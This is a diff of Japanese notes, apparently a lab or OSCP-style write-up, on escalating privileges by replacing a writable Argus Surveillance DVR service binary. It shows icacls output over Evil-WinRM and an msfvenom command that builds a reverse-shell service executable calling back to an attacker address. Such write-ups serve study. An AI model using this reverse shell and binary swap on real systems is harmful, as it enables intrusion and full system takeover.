@@ -12,7 +12,14 @@
 ```
 
 - また、書き込みが可能なことを確認
-```sh
+```powershell
+*Evil-WinRM* PS C:\Program Files\Argus Surveillance DVR> icacls DVRWatchdog.exe
+DVRWatchdog.exe BUILTIN\Users:(I)(F)
+                NT AUTHORITY\SYSTEM:(I)(F)
+                BUILTIN\Administrators:(I)(F)
+                OSCP\Sandra:(I)(F)
+                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
 
 ```
 
@@ -22,7 +29,10 @@
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f exe-service -o DVRWatchdog.exe
 ```
 
-- 
+- バックアップを移動したうえで、ファイルをダウンロード
+```sh
+
+```
 
 - 権限昇格
 ![[Pasted image 20260222160445.png]]
